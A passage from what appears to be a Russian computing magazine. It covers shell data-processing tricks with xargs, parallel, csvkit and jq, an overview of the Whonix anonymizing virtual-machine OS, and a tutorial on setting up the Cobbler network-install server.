$ ls | xargs -P3 -n1 ls
pikachu.avi
1_bar.txt  1_foo.txt
unforgivable_pics.zip
$ ls | xargs -P3 -n1 ls
1_bar.txt  1_foo.txt
pikachu.avi
unforgivable_pics.zip

Что-то эта ситуация напоминает, не правда ли? Несколько независимых про-
цессов, пишущих в одну консоль, например? Да-да, параметр -P здесь задает
количество процессов для запуска (можно поставить число ядер процессора,
например ;)), а -n указывает, сколько строк из входа одновременно переда-
вать каждому процессу. В результате запускается не один, а сразу три экзем-
пляра команды ls, каждый из которых начинает разбирать строчки из очере-
ди, организованной xargs. Кто первый встал — того и тапки, причем команда
не завершается, пока не отработает последний воркер, то есть барьер здесь
тоже есть.
  Дальше — больше. Понадобилось мне как-то скопировать приличное ко-
личество файлов с HDFS. Делать это в большом цикле — очень долго, писать
навороченные скрипты специально для этой задачи — как-то уныло. В итоге
через несколько минут появилось вот такое детище Франкенштейна:

$ cat file.txt | xargs -l bash -c 'echo hdfs dfs -get $0 $1' |
    xargs -I'{}' -d '\n' -n1 -P8 -t bash -c "eval {}"

Сейчас объясню. На входе был файл, в котором на каждой строчке два пути —
адрес файла внутри HDFS и место, куда его надо скопировать локально. Что-
бы скопировать данные быстро, необходимо было запустить операции копи-
рования в несколько потоков. Первый вызов xargs превращает поток из пар
адресов в поток команд по копированию данных (file1  file2 становится echo
hdfs dfs -get file1 file2), также разделенных переносом строки (-d во вто-
ром xargs как раз для обработки такого случая). После этого поток передает-
ся второму xargs, который выполняет сформированные на предыдущем шаге
команды в восемь потоков. Громоздко? Да, можно так сказать. Но на отлично
решает задачу и сильно экономит время.
   Есть еще одна команда, специально для параллелизации, с довольно не-
ожиданным названием parallel. Она сама определяет, сколько процессов за-
пустить (хоть это можно и задавать явно, как в примере ниже), а кроме того,
позволяет буквально «разветвить трубопровод» и разбрасывать данные, по-
ступающие с одного pipe’а по нескольким другим pipe’ам. Так, с ее помощью
можно организовать параллельное конвертирование WAV-файлов в MP3:

$ ls *.wav | parallel lame {} -o {}.mp3

Если ты злишься на меня за cURL из предыдущей части статьи, то вот пример
с Wget:

$ cat urls.txt | parallel -j+2 'wget "{}" -O - | python parse.py'

Здесь у нас на входе файл с большим числом урлов, а parallel запускает ко-
личество воркеров, равное числу ядер CPU плюс 2. Каждый воркер скачивает
страничку и передает ее на стандартный вход скрипту на Python, который, воз-
можно, ее парсит и делает еще какую-нибудь хакерскую магию.

ФОРМАТЫ ВОКРУГ НАС
Думаю, не погрешу против истины, если скажу, что два самых популярных фор-
мата данных, с которыми приходится сталкиваться при анализе (да и при про-
граммировании вообще), — это CSV (включая подвиды с другими раздели-
телями) и JSON. В последнее время также становится популярен YAML,
но аналитические данные в нем обычно не хранят, это скорее из стана конфи-
гурационных файлов и прочих декларативных описаний.
   Если ты думаешь, что с CSV в общем случае работать легко и просто, то это
только потому, что тебе не попадались такие строки:

1,2, "vova,dima",7
3,, "lenin",0

Это абсолютно корректный CSV, однако что получится, если мы попробу-
ем разбить верхнюю строчку по запятой? Или какое значение у нас окажется
во втором поле нижней строки? Погоди рвать волосы, решение есть. И оно,
как ни странно, реализовано в виде модуля для Python, который, в свою оче-
редь, предоставляет набор консольных команд для разных задач. Модуль на-
зывается csvkit и включает в себя несколько интересных утилит:
•  in2csv — «не знаю, что это, но я хочу преобразовать это в CSV», работает,
   например, с файлами Excel;
•  csvcut — позволяет корректно манипулировать колонками, в том числе ис-
   пользуя их имена;
• csvlook— выводит CSV как красивую табличку в терминале, по аналогии
   с консольными клиентами к БД;
•  csvjson — конвертирует CSV в JSON в виде списка объектов с полями и зна-
   чениями;
•  csvsql — всего-навсего позволяет делать SQL-запросы к CSV-документам.
   Not a big deal;
•  csvsort — позволяет сортировать по колонкам, в том числе используя их
   имена.

Неплохо, да? Целая инфраструктура. Если хочется осознать всю прелесть —
можно, например, взять файл imdb-250-1996-2011-lists-only.xlsx, а потом сде-
лать так:

$ in2csv imdb-250-1996-2011-lists-only.xlsx | csvsql --query
    "select Title,Year from stdin where Year<2009" | csvsort -r
    -c Year | head -n 10 | csvlook

Мне кажется, даже объяснять, что конкретно здесь происходит, не требует-
ся — после прочтения текста выше это должно быть довольно очевидно. По-
пробуй понять и прочувствовать сам.
   «Ну да, с CSV-то и простыми текстовыми форматами это все работа-
ет, но в случае JSON мне ничто такое не поможет», — подумал ты. И напрас-
но. Утилита jq позволяет делать с JSON-файлами чуть менее, чем все. Если
учесть, что парой абзацев выше упоминалась команда csvjson, то простор
для действия практически неограничен.
  Самый простой способ начать работу с ней — это подать на вход какой-ни-
будь JSON-файл и получить выдачу в консоли с красивыми отступами и под-
светкой синтаксиса (!). Поскольку в JSON все — либо объект, либо список
объектов, то мы обращаемся ко всему, используя либо точку, либо квадратные
скобки:

$ echo '{"first_name": "Paul", "last_name": "McCartney"}' | jq "."
{
  "first_name": "Paul",
  "last_name": "McCartney"
}
$ echo '{"first_name": "Paul", "last_name": "McCartney"}' |
    jq ".first_name"
"Paul"
$ echo '[{"name": "John"}, {"name":"Paul"}, {"name":"George"},
    {"name": "Ringo"}]' | jq '.[] | select(.name | contains("o"))'
{
  "name": "John"
}
{
  "name": "George"
}
{
  "name": "Ringo"
}





                                                  jq можно опробовать и не устанавливая на комп

Чтобы полнее описать потенциал этой утилиты, приведу один совсем суровый
пример, который реально использовался в продакшене:

$ cat file.csv | csvjson —stream | jq -c 'if .createdDate != ""
then .createdDate = (.standardRegCreatedDate | split(" ") |
.[0:2] | join("T") + "Z" ) else .createdDate = "9999-01-01T00:00:00Z"
| to_entries | map(select(.key | contains("rawText") | not ) ) |
from_entries' | ...

Предыстория здесь такова. У меня была прорва CSV-файлов, в которых в ко-
лонке createdDate было полно всякой дряни, не имеющей отношения к датам.
Но в поле standardRegCreatedDate даты стояли обычно верные, хотя в не со-
всем корректном формате. Да еще попадались поля с нечищеными данны-
ми — в их названии значились слова rawText, и их можно было вообще выки-
нуть. Для того чтобы все это разрулить, пришлось написать вот такую довольно
громоздкую конструкцию с манипуляцией строками, преобразованием в пары
ключ — значение и обратно.
  Но и это еще не все. Приведенный мегаконвейер не полный, ведь данные
надо было не только обработать, но и залить в Elasticsearch, и не просто за-
лить, а в виде HTTP bulk-запросов в определенном формате (если очень инте-
ресно — об этом можно почитать здесь). И вот здесь я как раз и задействовал
описанную выше технику распараллеливания:

$ ... | awk '{ print "{\"index\": {} }","\n" $0 }' | parallel
    --pipe -N500 curl -s -XPOST localhost:9200/items/entry/_bulk
    --data-binary @- > /dev/null

С awk все просто: формируем запросы определенной
структуры. А вот что происходит дальше. Parallel запускает
одновременно столько процессов curl, сколько у нас есть
ядер CPU, открывает с каждым из них pipe и отдает каждо-
му на stdin по 500 строк из ввода. Каждый curl принимает
все данные с stdin и швыряет их сразу в базу, используя
запросы к bulk API. Такими темпами я за несколько ча-                                   WWW
сов залил более 10 Гбайт данных, что в целом неплохо —
по крайней мере куда быстрее, чем обычный цикл.             Недавно вышла тонень-
                                                                                      кая, но очень интерес-
                                                                          ная книжка, в которой
КОНСОЛЬНЫЕ МОНСТРЫ                                   упоминаются многие
Данных вокруг нас становится все больше, и работать     из описанных в статье
                                                                         трюков и хитростей,над понижением уровня энтропии во вселенной все                                                                    плюс есть много до-
сложнее. Я надеюсь, что использование описанных трю-     полнительных приемов
ков поможет тебе при выполнении рутинных задач с фай-     и утилит, также вполне
                                                                         достойных внимания.лами, данными и процессами, будь ты data scientist’ом,
                                                                   Она на английском
инженером, волшебным гномом или даже сисадмином.                                                                               языке, но это же тебя
В конце концов, можно даже придумать, как подобными      не остановит, верно?
трюками впечатлить девушку.
UNIXOID
ВИРТУАЛЬНЫЕ
АНОНИМЫ





                                          Евгений Зобнин
                                                          androidstreet.net

  ЗНАКОМИМСЯ С АНОНИМИЗИРУЮЩЕЙ
       ОПЕРАЦИОНКОЙ WHONIX




Когда мы говорим об анонимности в интернете, то чаще
всего подразумеваем такие проекты, как Tor, I2P, Tor
Browser, DNSCrypt и Live CD TAILS, включающий в себя
все перечисленное. Однако существует менее известная,
но очень интересная система Whonix, использующая вир-
туализацию в качестве средства изоляции рабочей стан-
ции от глобальной сети и способная защитить твою ано-
нимность даже после взлома.


ВМЕСТО ВВЕДЕНИЯ
Чтобы обеспечить анонимность своего пребывания в Сети, мало установить
Tor и завернуть в него весь исходящий трафик. Необходимо позаботиться
о таких вещах, как утечки DNS, обнаружение твоего географического поло-
жения на основе настроек часового пояса, утечки имени пользователя (через
SSH, например), утечки IP-адреса, свойственные некоторым сетевым протоко-
лам, побороть проблему идентификации машины на выходных узлах Tor путем
сравнения типов трафика. Ну и в целом придется серьезно повозиться, чтобы
заставить все установленные сетевые приложения использовать Tor и не вы-
давать данных о твоей машине.
  Ты можешь сделать все это сам, но лучше взять проверенное готовое ре-
шение, а именно дистрибутив TAILS. Он включает в себя множество предна-
строенных приложений, корректно настроенный Tor и брандмауэр, так что
в целом это достаточно надежная в плане сохранения анонимности и приват-
ности система, которой не гнушался пользоваться сам Эдвард Сноуден.
   Однако у TAILS есть два серьезных ограничения. Во-первых, это Live CD,
изначально позиционируемый как «одноразовый»: TAILS не умеет запоминать
свое состояние между выключениями и не оставляет никаких следов на маши-
не. Как средство для слива секретных документов АНБ несколько раз за всю
жизнь это превосходный инструмент, как повседневно используемая систе-
ма — ужасный. Во-вторых, запуская TAILS на голом железе, юзер автомати-
чески открывает серьезную дыру в своей анонимности. Ведь конфигурация
ПК тоже позволяет идентифицировать человека.
  Плюс TAILS никак не защищена от компрометации системы. Любой взло-
мавший твою машину сразу деанонимизирует и твой IP, и тебя самого. Что-
бы этого избежать, запланировано размещать ключевые системные серви-
сы в песочницах — но только в версии 3.0, которая непонятно когда выйдет,
да это и не даст стопроцентной защиты. А самое печальное, что «благодаря»
необновляемости системы ты не сможешь быстро залатать дыру, с помощью
которой тебя взломали, придется ждать официальный релиз свежей версии
TAILS (при условии, что информация о дыре находится в открытом доступе).
   Для решения всех этих проблем как раз и предназначен Linux-дистрибутив
Whonix, преследующий те же цели, но достигающий их несколько иным путем.

СИЛА ВИРТУАЛИЗАЦИИ
TAILS распространяется в форме немодифицируемого Live CD не толь-
ко для защиты от троянов и от возможных утечек конфиденциальных данных
при получении физического доступа к машине, но и для банальной «защиты
от дурака». Разработчики не могут быть уверены, что пользователь коррек-
тно настроит каждое установленное им приложение и не спровоцирует утечку
данных или раскрытие своего IP. А если систему нельзя менять, то и проблема
пропадает сама собой.
   Whonix, с другой стороны, изначально разрабатывался с оглядкой на воз-
можность модификации системы и «настройки под себя», поэтому, кроме ис-
пользуемых в TAILS методов защиты от утечек и фингерпринтинга, здесь ре-
ализована довольно интересная архитектура с применением виртуализации.
Whonix распространяется в двух образах VirtualBox: один играет роль шлюза
в глобальную сеть через Tor, а второй — это рабочая машина с браузером,
чат-, email-клиентами и другим софтом, в том числе тем, что можно установить
из репозиториев. Оба образа основаны на Debian.
   Единственный способ выйти во внешний мир для рабочей машины — это
шлюз, единственный путь трафика во внешний мир из шлюза и обратно — че-
рез сеть Tor. Неважно, насколько протекающий софт ты установишь на рабо-
чую машину, он все равно тебя не выдаст. Получить доступ к интернету в обход
Tor приложение не сможет, IP-адрес увидит только локальный, именем поль-
зователя для него будет просто user (разработчики не рекомендуют его ме-
нять), а информацией о железе — стандартная конфигурация VirtualBox. Тебя
не удастся отследить даже по временной зоне, часы здесь настроены на UTC,
а для синхронизации времени используются time stamp’ы HTTP-заголовков,
отдаваемых случайно выбранными веб-серверами.
  Самая же интересная черта системы в том, что она вовсе не требует, чтобы
ты использовал именно рабочую машину Whonix. Главный компонент здесь —
это шлюз, к которому можно подцепить любую другую запущенную в виртуал-
ке ОС, будь то Ubuntu, Windows или OS X, и получить почти такой же уровень
защиты от отслеживания (см. официальную документацию). «Почти такой же»
потому, что, кроме графического окружения и набора приложений, рабочая
машина Whonix включает набор инструментов и настроек, позволяющих защи-
тить тебя от отслеживания с помощью сравнения типов трафика на выходных
узлах Tor (identity correlation through Tor circuit sharing) и определения настроек
твоих часов и uptime’а через NTP и метки времени TCP/ICMP (все это подроб-
но описано на wiki-странице Whonix).
   Первая задача здесь решается с помощью изоляции потоков (stream
isolation), все поставляемое в комплекте рабочей машины ПО заранее настро-
ено на использование разных портов Tor (SocksPort) и враппера uwt, пере-
направляющего трафик на разные Tor-порты, если приложение само не пре-
доставляет такой возможности (используется для apt-get, cURL, Git и других
консольных инструментов). Поэтому трафик всех приложений идет через раз-
ные цепочки Tor-узлов на разные выходные узлы. Вторая проблема решает-
ся с использованием утилиты sdwdate, которая синхронизирует часы не через
NTP, а обращаясь к случайно выбранным серверам.





                                                 Концепция stream isolation

Whonix поддерживает любые виды туннелирования трафика Tor через VPN/
SSH (или наоборот). Эта функция может очень пригодиться, если твой провай-
дер блокирует Tor (в этом случае VPN-клиент устанавливается на шлюз и Tor
использует его для связи с другими узлами), или для скрытия трафика уже по-
сле того, как он покинул выходной узел Tor (VPN-клиент устанавливается на ра-
бочую машину, так что Tor роутит уже зашифрованный трафик).

ПРОБУЕМ
Итак, Whonix — это два преднастроенных образа для VirtualBox или Linux KVM.
Поэтому систему можно запустить в любой операционке, для которой есть
официальная версия VirtualBox, а это Linux, Windows, OS X и Solaris. Все, что
для этого требуется сделать, — это скачать оба образа (суммарный объем 3,5
Гбайт) и затем импортировать их в VirtualBox с помощью меню File     Import
Appliance.
   Далее запускаем Whonix-Gateway и дожидаемся его загрузки. После появ-
ления рабочего стола (да, у шлюза есть графический интерфейс, так что раз-
берутся даже самые маленькие) система предложит согласиться с дисклейме-
ром, запустить Tor и обновить пакеты, затем запустится утилита whonixcheck,
которая проверит подключение к Tor и корректность настроек системы, одно-
временно с ней отработает служба синхронизации времени sdwdate.





                          Whonixcheck предупреждает о наличии новых версий пакетов

Сразу скажу о двух неочевидных моментах. Шлюз и рабочая станция Whonix
никогда не подключаются к интернету напрямую и используют Tor даже для об-
новления пакетов из сетевых репозиториев. Поэтому сразу приготовься к до-
вольно значительному проседанию скорости (я получил невероятно медлен-
ные по нынешним меркам 500 Кбайт/с).
   Второй момент — шлюз совсем не обязательно запускать с графиче-
ским интерфейсом, который будет понапрасну жрать оперативку. Более того,
здесь есть механизм, автоматически загружающий шлюз в текстовом режи-
ме, если в настройках виртуалки выделить машине 192 Мбайт. Чтобы сделать
это, достаточно кликнуть правой кнопкой на Whonix-Gateway, выбрать Settings
и на вкладке System сдвинуть ползунок до значения 192. В итоге ты ничего
не потеряешь, так как все, что позволяет сделать графический интерфейс, —
это перезапустить Tor кликом мыши, отредактировать настройки брандмауэра
и запустить интерфейс мониторинга Tor под названием arm (и он текстовый).





                                                Отключаем графику на шлюзе





                                                             Текстовая утилита arm


После окончания загрузки шлюза можно запускать десктоп. Последователь-
ность действий тут почти такая же: запускаем виртуалку, соглашаемся с дис-
клеймером, соглашаемся обновить пакеты, ждем окончания проверки со-
единения с Tor и синхронизации времени. Далее можно начать работать.
Правда, предустановленных приложений тут кот наплакал. Из повседневно не-
обходимых только Tor Browser, IRC-клиент XChat и KGpg. Причем первый даже
не установлен; после клика по иконке запускается инсталлятор, который пред-
лагает выкачать браузер через Tor.





                                                                             Tor Browser

Остальной необходимый софт ты волен ставить из репозиториев с помощью
стандартной команды «sudo apt-get install приложение». В ответ на запрос па-
роля вводим changeme и, конечно же, меняем пароль с помощью команды
passwd.

STREAM ISOLATION
Устанавливая сторонний софт в Whonix, ты сразу столкнешься с проблемой,
называемой identity correlation through Tor circuit sharing. Не решусь перевести
этот термин, просто скажу, что по умолчанию левый софт использует систем-
ные настройки SOCKS-прокси, а это единый стандартный порт Tor (TransPort).
Проблема такой настройки в том, что, просто сравнивая типы трафика и их
временную связь (например, ты можешь использовать Telegram одновремен-
но с WhatsApp), выходной узел может установить связь между разными сеан-
сами использования приложений и идентифицировать тебя (но не твой IP или
географическое положение).
   Для борьбы с данным типом атаки в Tor есть механизм, названный stream
isolation, он позволяет разделить трафик разных приложений, направив его
в разные цепочки узлов Tor. Использовать его довольно просто — надо всего
лишь создать в настройках Tor несколько дополнительных портов SOCKS и на-
строить сами приложения так, чтобы они использовали разные порты. Whonix
уже имеет такие настройки: предустановленный софт использует порты 9100–
9149. Также в нем есть набор свободных портов для стороннего софта:
•  9153–9159 — свободные;
•  9160–9169 — свободные с опцией IsolateDestAddress;
•  9170–7179 — свободные с опцией IsolateDestPort;
•  9180–9189 — с обеими опциями.

Все,  что  остается, —  это  настроить софт  на  использование  адреса
10.152.152.10 и любого из этих портов в качестве адреса SOCKS-сервера.
Причем использовать порты с опциями IsolateDestPort и/или IsolateDestAddr я
бы не рекомендовал. Они разделяют даже трафик одного приложения на ос-
нове адреса удаленного порта или адреса. В большинстве случаев это избы-
точно и очень накладно (представь, если торрент-клиент или веб-браузер бу-
дет использовать разные цепочки узлов Tor для всех соединений).





                                   Настройки портов для предустановленного софта

ВЫВОДЫ
Whonix, при всех своих странностях и неоднозначностях, определенно стоит
внимания любого, кто хочет обеспечить свою анонимность в Сети. По умолча-
нию это всего лишь система для запуска Tor Browser, однако при наличии рук
и свободного времени из Whonix можно сделать полноценную рабочую систе-
му, и необходимость запуска системы в виртуалке этому нисколько не мешает.
Ну и конечно же, стоит помнить, что абсолютной анонимности не существует.
Если надо — тебя найдут. Следи за собой, будь осторожен.
SYNACK
НАКАТЫВАЕМ              РАЗБИРАЕМСЯ С СЕРВЕРОМ
              УСТАНОВКИ СOBBLER
ОСЬ
                                                               Мартин
                                                                                       «urban.prankster»
                                                                  Пранкевич
                                                                            prank.urban@gmail.com





Развертывание большого количества систем и приложе-
ний — задача непростая и многоэтапная. За долгое время
было разработано большое количество технологий и ин-
струментов, их реализующих, поэтому с ходу разобраться
не всегда просто. Сobbler сводит разные решения в один
проект, а единый интерфейс позволяет не отвлекаться
на особенности работы с каждым из них.

ПРОЕКТ СOBBLER
Сobbler — это сервер сетевой установки и обновления Linux- и Windows-си-
стем, позволяющий создать среду бездисковой загрузки, включающую обра-
зы и репозитории пакетов, сконфигурировать и развернуть ОС. Поддержи-
ваются как реальные ПК, так и виртуальные машины. По факту Сobbler — это
удобная надстройка над привычными инструментами PXE, TFTP, DHCP и DNS,
обеспечивающими сетевую загрузку систем, и утилитами работы с образами
и репозиториями. От администратора скрыты особенности и настройки всех
компонентов, после установки доступны шаблоны конфигурационных файлов,
которые находятся в одном каталоге, необходимо лишь изменить их под свои
условия. Управление всеми связанными демонами (перезагрузка и обновле-
ние конфигурации) осуществляется всего одной командой.
   Также Cobbler интегрирован в среду управления Spacewalk (систему ав-
томатизации управления конфигурацией Puppet и Func), позволяющую отда-
вать команды одновременно на множество систем. Причем можно, например,
как вызывать Puppet после развертывания ОС средствами Cobbler, так и наобо-
рот — использовать Cobbler в манифестах Puppet. Поддерживается интеграция
с LDAP. Все это обеспечивает полный цикл управления IT-инфраструктурой.
   Изначально Cobbler был рассчитан на установку и использование в дистри-
бутивах, производных от Red Hat, — RHEL, CentOS, Fedora и так далее. Со вре-
менем он был адаптирован для Ubuntu, Debian, SUSE, а в репозиториях этих
дистрибутивов появились пакеты. При развертывании с помощью Cobbler OC
Windows всю первоначальную подготовку образов необходимо будет делать
самостоятельно при помощи Windows AIK / Windows ADK.
   Написан Сobbler на Python, распространяется по лицензии GNU GPLv2.
Управление осуществляется при помощи консольной утилиты cobbler или
веб-интерфейса. Для интеграции со сторонними приложениями предлагается
XML-RPC-интерфейс.

УСТАНОВКА СOBBLER
Сobbler, несмотря на внешнюю простоту, достаточно сложная система, пре-
жде всего из-за большого спектра различных технологий, но он обеспечива-
ет основную функциональность из коробки практически без дополнительной
подстройки. Хотя представление о сетевой загрузке, знание PXE и методики
автоматизации установки дистрибутива очень приветствуются.
  На момент написания статьи текущая версия 2.6.11. В репозитории EPEL
находится именно она, в репозитории Ubuntu релиз ощутимо запаздывает
(на момент написания статьи — 2.4.1). При необходимости установить самый
свежий релиз всегда можно, используя исходные тексты Git. В принципе, ал-
горитм развертывания Сobbler не меняется уже несколько лет, поэтому все
сказанное актуально и для других версий. Работе Cobbler будет мешать firewall
и SELinux, в тестовой среде их можно отключить. В брандмауэре должны быть
открыты порты 69, 80, 443 и 25151 (в установке по умолчанию). В Red Hat дис-
трибутивах понадобится подключить репозиторий EPEL, в Ubuntu нужный па-
кет уже есть в основном репозитории.

$ sudo apt install cobbler cobbler-web

В принципе, cobbler-web — необязательный компонент и необходим только
в том случае, если планируется использовать веб-интерфейс. Все настройки
можно делать в командной строке.
  В процессе будут установлены некоторые пакеты для удовлетворения за-
висимостей. Следует внимательно ознакомиться с их списком: для разных
дистрибутивов и их версий он будет отличаться. В качестве DNS и DHCP мо-
жет быть использован как сервер, установленный на локальной системе, так
и любой внешний доступный сервер.
  В Ubuntu, например, все пакеты, необходимые для сетевой загрузки и ра-
боты с образами, представлены в качестве рекомендуемых и по умолчанию
не ставятся: DNS (BIND9), DHCP-сервер, TFPTD-утилиты создания метадан-
ных createrepo, debmirror, genisoimage, pxelinux и другие. Сobbler поддержи-
вает dhcp3-server и dnsmasq (обеспечивает как DNS, так и DHCP). В зависи-
мостях пакетов указано имя dhcp3-server, но в новых версиях Ubuntu пакет
переименован в isc-dhcp-server. Сам Cobbler имеет встроенный TFTP-сер-
вер, но рекомендуется использовать внешний.
  В Red Hat список, конечно, будет чуть другой.

# wget http://dl.fedoraproject.org/pub/epel/epel-release-latest
    -7.noarch.rpm
# rpm -Uvh epel-release-latest-7.noarch.rpm
# yum install cobbler cobbler-web dhcp debmirror pykickstart
    system-config-kickstart dhcp mod_python tftp cman -y

После установки запускаем:

$ sudo service cobbler start

В Red Hat демон называется cobblerd. Все установлено, теперь можно пере-
ходить к настройкам.

НАСТРОЙКИ COBBLER
После установки в каталоге /etc/cobbler появится несколько подкаталогов,
в которых находятся шаблоны сервисов, параметры аутентификации, выбо-
ра модулей и другие. Назначение некоторых и настройки внутри, в принципе,
должны быть понятны. Кроме этого, в /var/lib/cobbler будут размещены ша-
блоны, касающиеся настройки ОС и работы PXE. Например, в kickstarts най-
дем несколько готовых шаблонов для работы Anaconda kickstart, в loaders —
загрузчики и так далее. При наличии своих готовых файлов просто копируем
сюда. В Red Hat дистрибутивах нужный файл после установки ОС находится
в домашнем каталоге root:

# cp /root/anaconda-ks.cfg /var/lib/cobbler/kickstarts/centos7.ks

В Ubuntu шаблоны kickstart в установочном образе находятся в каталоге
pressed:

$ sudo cp -v preseed/*seed /var/lib/cobbler/kickstarts/
/mnt/preseed/sample.seed -> /var/lib/cobbler/kickstarts/sample.seed

Демон cobblerd берет установки в файле /etc/cobbler/settings. Здесь
находятся параметры использования других сервисов (TFTP, DHCP, Puppet,
Func, LDAP и так далее), отправка отчетов на SMTP, виртуальные интерфейсы,
рабочие каталоги и прочее. Файл в YAML-стандарте, хорошо комментирован,
поэтому разобраться можно.
   Управление настройками и функциями Cobbler производится при помощи
веб-интерфейса и консольной утилиты cobbler. Все параметры можно посмо-
треть в man-странице или запустив с ключом --help.
   Веб-интерфейс доступен по адресу https://server/cobbler_web, также
через веб можно получить доступ к XML-RPC http://server/cobbler_api.
В вебе четыре секции: Configuration, Resources, Actions и Cobbler. Пользовать-
ся в общем просто: нажимаем ссылку или заполняем параметры. В веб-кон-
соли в большинстве пунктов доступны основные параметры, более тонкую на-
стройку можно сделать только в консоли. Хотя, например, настройка системы
через веб устроена очень наглядно и удобно.
   После установки для проверки готовности компонентов сервера и анализа
файла settings необходимо запустить утилиту cobbler с параметром check:

$ sudo cobbler check

При первом запуске в ответ получим список проблем, которые следует ре-
шить перед использованием Cobbler. В каждой ситуации он будет свой, хотя
несколько пунктов, касающиеся установок по умолчанию, обычно характерны
для всех дистрибутивов. Следует внимательно их изучить и после устранения
повторно запустить проверку.





                                    Проверка готовности при помощи cobbler check

На этом этапе можно получить ошибку. Наиболее распространены две. Пер-
вая, «httpd does not appear to be running and proxying cobbler», появляется в том
случае, если веб-сервер Apache или cobblerd не запущен (например, стар-
товал и отвалился из-за ошибки), отключен модуль веб-сервера mod_proxy,
занят другим приложением или блокирован брандмауэром 80-й или 25151-й
порт. Следует проверить статусы сервисов и просмотреть логи. В Ubuntu, на-
пример, модуль mod_python установлен в виде зависимостей, но конфликто-
вал с mod_wsgi, поэтому пришлось его отключить.

$ sudo a2dismod python

Изменить порты можно в файле setting в параметрах:

http_port: 80
xmlrpc_port: 25151

Вторая ошибка связана с невозможностью провести аутентификацию в XML-
RPC.

xmlrpclib.Fault:
    <Fault 1: "<class 'cobbler.cexceptions.CX'>:'login failed'">

Необязательно это проблема учетных данных, скорее неправильно настроен
определенный параметр или сервис. Но разберемся с управлением учетными
записями.

УЧЕТНЫЕ ДАННЫЕ
Во время установки автоматически ставится логин/пароль cobbler/cobbler
для доступа через веб-интерфейс или XML-RPC. Аутентификация возмож-
на разными способами: логин/пароль, PAM, Kerberos, LDAP, Spacewalk, есть
тестовый (testing/testing) и свой модуль. Настраиваются они в /etc/
cobbler/modules.conf. По умолчанию:

[authentication]
module = authn_configfile

В данном случае используется файл /etc/cobbler/users.digest, логин
и пароль для которого генерируется как при работе с веб-сервером:

$ htdigest /etc/cobbler/users.digest "Cobbler" user

Ввести по запросу пароль. Если указан способ authn_denyall, это значит, что
вход заблокирован, и нужно изменить метод.
   Строка, отвечающая за авторизацию, показывает, что все пользователи бу-
дут иметь права администратора.

[authorization]
module = authz_allowall

Это удобно, если доступ будет у небольшого количества пользователей. Заме-
нив значение на authz_ownership, мы получаем возможность использования
групп, то есть определенные пользователи могут управлять установкой сво-
их систем. Группы описываются в файле users.conf. Все, кто входит в груп-
пу admin или в секцию admins(, могут управлять любыми объектами. Группа
для всех объектов по умолчанию (то есть тех, для которых не указан владе-
лец параметром --owner в командной строке) устанавливается параметром
default_ownership в файле settings:

default_ownership: "admin"

При установке новых ОС для root используется пароль, указанный в параме-
тре (в зашифрованном виде):

default_password_crypted: ""

По умолчанию пароль — cobbler, но следует его изменить, вставив между ка-
вычками сгенерированный при помощи команды openssl passwd -1 MD5-хеш.
  Еще два параметра в файле требуют внимания, иначе работать не будет:
server и next_server, в которых следует прописать IP-адрес или имя серве-
ра. Они используются для поиска сервера клиентами и при PXE-загрузке.

server: 192.168.1.1
next_server: 192.168.1.1

В Ubuntu нужный IP ставится во время установки, в Red Hat обычно стоит
127.0.0.1. Также можно разрешать локальные запросы отправлять на localhost,
а не использовать внешний IP:

client_use_localhost=1

Далее просматриваем все параметры и включаем нужные. Прописываем
в bind_master и default_name_servers серверы, которые будут использо-
ваться, и включаем управление нужными функциями. После установки DNS
и DHCP по умолчанию отключены — просто меняем 0 на 1 там, где нам нужно:

manage_dhcp: 1
manage_dns: 1
manage_tftpd: 1

Еще важный момент. До версии Cobbler 2.4.0, чтобы вступили в силу все из-
менения в /etc/cobbler/settings, требовалась обязательная перезагруз-
ка демона. Теперь все параметры можно настраивать на лету при помощи ко-
манды cobbler setting. По умолчанию такая возможность отключена, чтобы
ее активировать, следует установить в 1 параметр allow_dynamic_settings
и перезапустить демон.
   Смотрим все настройки:

$ sudo cobbler setting report





                                                   Вывод установок Cobbler
И меняем нужную:

$ sudo cobbler setting edit --name=manage_dhcp --value=1

После этого значение вступит в силу и будет сохранено в файле. Если оши-
биться с названием параметра, будет выдана ошибка, но неправильное зна-
чение будет молча проигнорировано.

НАСТРОЙКИ СЛУЖБ
Для настроек служб DNS, DHCP, TFTPD, rsync используются шаблоны (файлы
с расширением .template), расположенные в /etc/cobbler. При этом DNS
и DHCP по умолчанию отключены, так как в сети уже может быть настроен та-
кой сервис, и они могут конфликтовать. Для BIND шаблон называется named.
template, для DHCP — dhcp.template, TFPTD — tftpd.template и так да-
лее. Шаблон, выводимый при PXE-загрузке, находится в /etc/cobbler/pxe/
pxedefault.template. Необходимо выбрать шаблоны, которые будут при-
меняться, и отредактировать параметры внутри под свои сетевые настройки.
В шаблонах используются переменные, на это место при копировании будет
подставлено значение параметра.





                                                Файлы шаблонов Cobbler

Далее в /etc/cobbler/modules.conf указываем в трех секциях модули, кото-
рые будут обеспечивать требуемые сервисы.

$ sudo nano /etc/cobbler/modules.conf
[dns]
module = manage_bind
[dhcp]
module = manage_isc
[tftpd]
module = manage_in_tftpd

Разрешаем запуск TFTP в конфигурационном файле xinetd, для чего в /etc/
xinetd.d/tftp устанавливаем параметр disable в no. Обеспечиваем авто-
запуск всех сервисов, как это принято в дистрибутиве, при помощи chkconfig
или update-rc.d.
   После внесения всех изменений в шаблоны и конфигурационные файлы
выполняется команда

$ sudo cobbler sync

В результате связанные демоны останавливаются, конфигурационные файлы
подменяются шаблоном и демон запускается. При работе через веб-интер-
фейс нажимаем ссылку SYNC, по окончании получим сообщение.

ПОДГОТАВЛИВАЕМ СРЕДУ ДЛЯ РАЗВЕРТЫВАНИЯ ОС
Теперь нам нужно скачать загрузчики, импортировать установочные образы,
добавить репозитории, файлы kickstart и связать это все в профили и системы.
Команда cobbler report покажет все используемые ОС, образы, файлы, репо-
зитории (у нас тут пока пусто).
  Под distro Cobbler подразумевается набор файлов для загрузки: ядро
и initrd (обязательные), kickstart-файл, дополнительные параметры ядра
и системы. Обновляем список загрузчиков:

$ sudo cobbler get-loaders

Добавить дистрибутив можно двумя способами. При доступном зеркале rsync,
DVD, NFS или файлах на диске используется ключ import (в веб-интерфейсе
пункт «Import DVD»).
  В консоли процесс очень прост. Вначале обязательно обновляем список
сигнатур, чтобы не было проблем с добавлением новых версий дистрибутивов
(файл /var/lib/cobbler/distro_signatures.json можно просто скопиро-
вать вручную с cobbler.github.io/signatures/2.6.x/latest.json):

$ sudo cobbler signature update

Монтируем образ и запускаем:

$ sudo mount ./ubuntu-desktop-amd64.iso /media/iso -t auto -o loop
$ sudo cobbler import --name=Ubuntu16_04 --arch=x86_64
